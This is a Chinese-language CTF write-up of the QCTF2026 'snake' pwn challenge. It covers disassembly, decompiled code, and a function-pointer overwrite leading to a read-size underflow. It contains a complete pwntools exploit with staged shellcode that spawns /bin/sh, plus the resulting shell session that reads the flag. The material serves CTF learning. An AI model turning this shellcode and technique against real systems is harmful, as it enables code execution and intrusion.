---
title: snake（QCTF2026 pwn）
date: 2026-10-21
category: Pwn
tags:
  - CTF
  - Writeup
  - pwn
draft: false
summary: "贪吃蛇小游戏（天真的我以为打通关了就有flag拿....）"
collection: QCTF2026
---
# snake

## 第一节：题目

贪吃蛇小游戏（天真的我以为打通关了就有flag拿....）
## 第二节：过程

依旧IDA打开附件，但是发现怎么里面的内容这么少？那我们干脆直接用objdump变成汇编语言了
虽然但是，我还是要把这段汇编给放出来
```asm

snake:     file format elf64-x86-64


Disassembly of section .text:

0000000000400078 <.text>:
  400078:	e8 8a 00 00 00       	call   0x400107
  40007d:	ff c0                	inc    eax
  40007f:	ff c7                	inc    edi
  400081:	48 8d 35 59 03 00 00 	lea    rsi,[rip+0x359]        # 0x4003e1
  400088:	6a 0b                	push   0xb
  40008a:	5a                   	pop    rdx
  40008b:	0f 05                	syscall
  40008d:	48 8d 05 6c 01 00 00 	lea    rax,[rip+0x16c]        # 0x400200
  400094:	48 89 05 0d 04 00 00 	mov    QWORD PTR [rip+0x40d],rax        # 0x4004a8
  40009b:	c6 05 0e 04 00 00 03 	mov    BYTE PTR [rip+0x40e],0x3        # 0x4004b0
  4000a2:	c6 05 0b 04 00 00 01 	mov    BYTE PTR [rip+0x40b],0x1        # 0x4004b4
  4000a9:	c7 05 05 04 00 00 10 	mov    DWORD PTR [rip+0x405],0xe0f10        # 0x4004b8
  4000b0:	0f 0e 00 
  4000b3:	c7 05 fb 04 00 00 08 	mov    DWORD PTR [rip+0x4fb],0x8080808        # 0x4005b8
  4000ba:	08 08 08 
  4000bd:	e8 2c 02 00 00       	call   0x4002ee
  4000c2:	e8 dd 00 00 00       	call   0x4001a4
  4000c7:	ff 15 db 03 00 00    	call   QWORD PTR [rip+0x3db]        # 0x4004a8
  4000cd:	e8 6c 02 00 00       	call   0x40033e
  4000d2:	6a 23                	push   0x23
  4000d4:	58                   	pop    rax
  4000d5:	48 8d 3d 27 03 00 00 	lea    rdi,[rip+0x327]        # 0x400403
  4000dc:	31 f6                	xor    esi,esi
  4000de:	0f 05                	syscall
  4000e0:	eb e0                	jmp    0x4000c2
  4000e2:	e8 87 00 00 00       	call   0x40016e
  4000e7:	6a 3c                	push   0x3c
  4000e9:	58                   	pop    rax
  4000ea:	31 ff                	xor    edi,edi
  4000ec:	0f 05                	syscall
  4000ee:	e8 4b 02 00 00       	call   0x40033e
  4000f3:	6a 01                	push   0x1
  4000f5:	58                   	pop    rax
  4000f6:	6a 01                	push   0x1
  4000f8:	5f                   	pop    rdi
  4000f9:	48 8d 35 ec 02 00 00 	lea    rsi,[rip+0x2ec]        # 0x4003ec
  400100:	6a 05                	push   0x5
  400102:	5a                   	pop    rdx
  400103:	0f 05                	syscall
  400105:	eb db                	jmp    0x4000e2
  400107:	6a 10                	push   0x10
  400109:	58                   	pop    rax
  40010a:	be 01 54 00 00       	mov    esi,0x5401
  40010f:	48 8d 15 02 03 00 00 	lea    rdx,[rip+0x302]        # 0x400418
  400116:	0f 05                	syscall
  400118:	48 8d 35 f9 02 00 00 	lea    rsi,[rip+0x2f9]        # 0x400418
  40011f:	48 8d 3d 32 03 00 00 	lea    rdi,[rip+0x332]        # 0x400458
  400126:	6a 40                	push   0x40
  400128:	59                   	pop    rcx
  400129:	f3 a4                	rep movs BYTE PTR [rdi],BYTE PTR [rsi]
  40012b:	83 25 32 03 00 00 f5 	and    DWORD PTR [rip+0x332],0xfffffff5        # 0x400464
  400132:	66 c7 05 33 03 00 00 	mov    WORD PTR [rip+0x333],0x0        # 0x40046e
  400139:	00 00 
  40013b:	6a 10                	push   0x10
  40013d:	58                   	pop    rax
  40013e:	31 ff                	xor    edi,edi
  400140:	be 02 54 00 00       	mov    esi,0x5402
  400145:	48 8d 15 0c 03 00 00 	lea    rdx,[rip+0x30c]        # 0x400458
  40014c:	0f 05                	syscall
  40014e:	6a 48                	push   0x48
  400150:	58                   	pop    rax
  400151:	31 ff                	xor    edi,edi
  400153:	6a 03                	push   0x3
  400155:	5e                   	pop    rsi
  ....一共有好多好多行把后面给删了

```
到底谁会读啊TAT
算了算了我们还是回到IDA，看看start函数，然后我们改名
```c
void __fastcall __noreturn start(unsigned int a1)
{
  __int64 v1; // rdx
  __int64 v2; // rcx
  __int64 v3; // rdi
  __int64 v4; // rsi
  int v5; // r8d

  init_terminal(a1);
  __asm { syscall; LINUX - }
  fnptr = snake_step;
  LOBYTE(snake_len) = 3;
  dir = 1;
  snake_x = 921360;  // x[0] = 16 x[1] = 15 x[2] = 14 x[3] = 0
  snake_y = 134744072; // y[0..3] = 8
  gen_food();
  while ( 1 )
  {
    read_input(a1: v3, a2: v4, a3: v1, a4: v2, a5: v5);
    fnptr();
    render();
    sys_nanosleep((struct timespec *)"", nullptr);
  }
}
```
这样的话刚刚的小蛇游戏在这里的代码就清清楚楚了
之后我们点read_input进去看看到底是什么东西
![](/assets/posts/qctf2026/qctf2026-pwn-snake-1.png)
我们发现了
```asm
lea  rsi, byte_4004A0        ; buf
mov  edx, r8d
sub  edx, offset byte_4004A0 ; 减的也是 0x4004A0
dec  edx                     ; count
```
我们的目标是拿shell，所以我们要找到能输入的地方给它打上execve("/bin/sh")
而fnptr 正常来说 = snake_step，但是如果我们把 fnptr的值改了，那就会执行我们的代码，而执行的内容我们又可控，那攻击思路就全了
那fnptr离buf到底有多远呢？我们来给出部分函数的位置
```asm
0x4004A0   buf          ← read 从这里开始写
0x4004A8   fnptr        
0x4004B0   snake_len
0x4004B4   dir
0x4004B8   snake_x
```
就差了8字节，所以我们发出去的第9~16个字节就落在fnptr上，read一共可以读多少字节呢
看之前的截图分析之后
```asm
4001A8:  lea  rsi, byte_4004A0      ; buf
4001AF:  mov  edx, r8d              ; count = r8
4001B2:  sub  edx, offset byte_4004A0  ; count -= 0x4004A0
4001B8:  dec  edx                   ; count -= 1
4001BA:  syscall                    ; read(0, buf, count)
```
所以count = r8 - 0x4004A0 -1
我们去找r8在哪里赋值过，read_input没有，那只能是上一个的render
![](/assets/posts/qctf2026/qctf2026-pwn-snake-2.png)
render每一次都把snake_x的地址给r8，r8就是0x4004B8
所以count最后计算下来就是 count = 0x4004B8 - 0x4004A0 - 1 = 0x18 - 1 = 0x17 = 23
~~力竭了，仇人看了都释怀~~
所以最后这23字节还得分开来打
1到8字节是代码，9到16字节是fnptr，17到23又是代码，拼好码来了
发出去之后，read把这23字节写到0x4004A0，然后虽然首字节是A但是这个不管，没事然后接下来循环进call fnptr但是已经被我们改成0x4004A0了，跳到了buf开头，然后就执行了mov r8d 0x80000，然后接着读后面的代码。但是ret会默认弹回call fnptr的下一条指令而又恰好是render，这就会导致我们前面好不容易改好的r8值就被冲掉了，所以我们要push一个地址把返回地址换掉，跳过render直接回循环
接下来是23字节分别是个什么东西

| 字节    | 十六进制                    | 汇编 / 数据          | 作用                |
| ----- | ----------------------- | ---------------- | ----------------- |
| 1~6   | 41 b8 00 00 08 00       | mov r8d, 0x80000 | 撑大下一次 read 的上限    |
| 7~8   | eb 08                   | jmp +8           | 跳过 fnptr 那 8 字节    |
| 9~16  | a0 04 40 00 00 00 00 00 | 0x4004A0         | 把 fnptr 改成 buf 开头    |
| 17~21 | 68 d2 00 40 00          | push 0x4000D2    | 跳回循环开头的同时绕开 render |
| 22    | c3                      | ret              | 跳过去               |
| 23    | 90                      | nop              | 凑满 23             |

而为什么写0x80000是因为下溢了。edx=0x80000 之后 -=0x4004A0 = 0xFFC7FB60
再 -1之后就是4个多G的大小，这下read就能从只读23个字节变成可以读4个G的量了
之后我们只要在exp里面写shellcode然后我们固定shellcode的位置，在fnptr里给它留出来就好了
```python
from pwn import *
import sys, time

io = remote(sys.argv[1], int(sys.argv[2]))

#修改read的限制让它下溢扩大上限
shot1 = bytes.fromhex(
    "41b800000800"      # mov r8d, 0x80000
    "eb08"              # jmp +8
    "a004400000000000"  # fnptr = 0x4004a0
    "68d2004000"        # push 0x4000d2
    "c3"                # ret
    "90"                # nop
)

#shellcode：清 O_NONBLOCK + 执行execve("/bin//sh") 
shellcode = bytes.fromhex(
    "6a485831ff6a045e31d20f05"  # fcntl(0, F_SETFL, 0)
    "6a00"                      # push 0     终止符，必须压在字符串下面
    "48bb2f62696e2f2f7368"      # movabs rbx, "/bin//sh"
    "53"                        # push rbx
    "4889e7"                    # mov rdi, rsp
    "6a00"                      # push 0     argv 结尾
    "57"                        # push rdi   argv[0]
    "4889e6"                    # mov rsi, rsp
    "31d2"                      # xor edx, edx
    "6a3b58"                    # push 59; pop rax
    "0f05"                      # syscall
)

#fnptr指向0x400500，shellcode放在偏移 96 处
# 0x400500 - 0x4004a0 = 0x60 = 96
shot2 = b"A" + b"." * 7 + p64(0x400500) + p64(0x4004a0)
shot2 = shot2 + b"." * (96 - len(shot2)) + shellcode

time.sleep(1)      
io.send(shot1)
time.sleep(1)         
io.send(shot2)
time.sleep(1) 
         
io.interactive()
```

然后就拿到shell了
```bash
             *                  WN\06>py -3.12 de.py nc1.ctfplus.cn 35215
                                fplus.cn on port 35215
                                fplus.cn on port 35215: Trying 43.248.116.26
                                fplus.cn on port 35215: Done
                                e
                      ooo@


wasd move, q quit
ls -la
total 24
drwxr-x--- 1 ctf  ctf  4096 Sep 20 16:10 .
drwxr-xr-x 1 root root 4096 Sep 20 16:10 ..
-rw-r--r-- 1 ctf  ctf   220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 ctf  ctf  3771 Jan  6  2022 .bashrc
-rw-r--r-- 1 ctf  ctf   807 Jan  6  2022 .profile
-rwxr-xr-x 1 root root 1400 Sep 20 16:09 snake
cat flag
cat: flag: No such file or directory
cat /flag
QCTF{3ac932c8-4211-4439-97d0-ac896aeae902}
```

复现flag
`QCTF{3ac932c8-4211-4439-97d0-ac896aeae902}`